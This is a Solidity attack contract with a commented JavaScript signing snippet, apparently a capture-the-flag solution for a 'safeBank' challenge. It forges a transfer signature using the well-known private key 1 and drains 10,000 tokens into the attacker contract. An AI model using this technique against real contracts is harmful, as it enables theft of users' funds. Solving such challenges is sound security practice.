pragma solidity 0.8.16;

interface IsafeBank {
    function safeTransfer(address from, address receiver, uint256 amount, bytes memory sig) external;
    function isCompleted() external;
}

contract safeBankAttack {
    function getHash() public view returns (bytes32) {
        return keccak256(abi.encodePacked(address(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf), uint256(10000000000000000000000), address(this)));
    }

    function attack(address bank_addr, bytes memory sig) public {
        IsafeBank(bank_addr).safeTransfer(address(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf),address(this),10000000000000000000000, sig);
        IsafeBank(bank_addr).isCompleted();
    }
}

/**
js代码
var Web3 = require('web3');
var web3 = new Web3(Web3.givenProvider);

let dataHash = "******"
let privateKey = "0x0000000000000000000000000000000000000000000000000000000000000001"

let sign = web3.eth.accounts.sign(dataHash, privateKey)

console.log("signature", sign.signature)

*/